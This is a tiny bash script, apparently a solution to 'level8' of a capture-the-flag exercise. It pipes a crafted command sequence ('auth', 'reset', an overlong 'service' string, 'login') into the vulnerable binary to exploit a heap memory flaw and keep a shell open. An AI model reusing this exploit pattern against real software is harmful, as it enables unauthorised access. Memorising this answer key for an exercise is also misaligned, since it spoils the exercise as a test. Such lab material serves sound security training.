#!/usr/bin/env bash

echo "auth 123
reset
service1234567890123456789012345678901
login" > exploit

cat exploit - | ./level8